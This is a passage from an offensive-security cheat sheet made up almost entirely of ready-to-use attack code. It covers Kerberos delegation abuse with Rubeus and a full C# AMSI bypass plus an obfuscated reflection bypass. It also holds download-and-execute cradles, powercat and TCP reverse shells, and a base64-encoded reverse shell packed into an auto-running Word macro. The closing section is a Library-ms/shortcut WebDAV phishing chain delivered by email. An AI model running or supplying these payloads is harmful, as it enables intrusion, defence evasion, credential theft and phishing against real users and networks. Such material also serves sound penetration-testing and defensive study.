.\Rubeus.exe dump /luid:<LUID> /nowrap
```

Extract this TGT

```c
.\Rubeus.exe dump /luid:<LUID> /nowrap
```

```c
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<TICKET>
```
OR 

Catch TGTs for computers accounts

```c
.\Rubeus.exe monitor /interval:10 /nowrap

SharpSpoolTrigger.exe <TargetComputerNAME_DC> <Listener>
```

OR

Get the ProcessID

```c
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<TICKET>
```

```c
steal_tocken <PID>
```
##### Constrained Delegations

```c
.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

Get the LUID of the service krbtgt

```c
.\Rubeus.exe triage
```

Get the TGT

```c
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
```

With this TGT we can impersonate any user in the domain. perform an S4U2Self first and then an S4U2Proxy

```c
.\Rubeus.exe s4u /impersonateuser:<USERNAME_2_IMP> /msdsspn:<msds-allowedtodelegateto> /user:<USERNAMEofTICKET> /ticket:<TICKET> /nowrap
```

Grab the final S4U2Proxy ticket and pass it into a new logon session

```c
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME_2_IMP> /password:FakePass /ticket:<S4U2_TICKET>
```

##### S4U2Self Abuse

First capture a TGT of a remote machine trying to connect to the dc

```c
Rubeus.exe monitor /interval:10 /nowrap

SharpSpoolTrigger.exe <TargetComputerNAME_DC> <Listener>
```

```c
.\Rubeus.exe s4u /impersonateuser:<ADMIN> /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:<USERNAME> /ticket:<CAPTURED_TICKET> /nowrap
```

##### Resource-Based Constrained Delegation

Get the SecurityIdentifier number

```c
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```
Convert

```c
powershell ConvertFrom-SID <SecurityIdentifierNumber>
```

Get the SID of a Computer account

```c
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
```

Create a security descriptor

```c
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```

In cobaltstrike

```c
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Seatbelt

```c
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all -full
.\Seatbelt.exe WindowsVault
.\Seatbelt.exe WindowsCredentialFiles
```

#### smbpasswd

```c
smbpasswd -r <RHOST> -U <USERNAME>
```

#### winexe

```c
winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

#### AMSI ByPass

Save as bypass

```c
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP
{
    public class Amsi
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void Bypass()
        {
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);
            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@
```
Compile

```c
Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```

Using Matt Graebers Reflection method disable AAMSI in memory for a little.

```c
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Use ISE Steroids https://powershell.one/isesteroids/quickstart/overview 
In the ise powershellISE 

```c
Start-Steroids 
Tools > Obfucate Code
```

Final obfucated code

```c
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```

First call bypass and then payload

```c
 iex (new-object net.webclient).downloadstring("http://IP/bypass"); iex (new-object net.webclient).downloadstring("http://<IP/<PAYLOAD")
```

Spawning a hidden PowerShell process using ShellWindows

```c
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
```

Weaponised example

```c
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```

### Social Engineering Tools

#### Microsoft Office Word Phishing Macro

##### Payload

```c
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
```

or

```c
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

or

```c
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

##### Encoding

> https://www.base64decode.org/

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```c
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

###### Alternatively using pwsh

```c
$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
```

##### Python Script for Formatting

```c
str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```c
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
```

##### Final Macro

```c
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

#### Microsoft Windows Library Files

##### Installation of wsgidav

```c
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

##### config.Library-ms

```c
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.

##### Shortcut File

Right-click on Windows to create a new `shortcut file`.

```c
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

Put the `shortcut file (*.lnk)` into the `webdav` folder.

##### Send Phishing Email

Create a random <FILE>.txt

```c
swaks --server <RHOST> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
```

### CVE

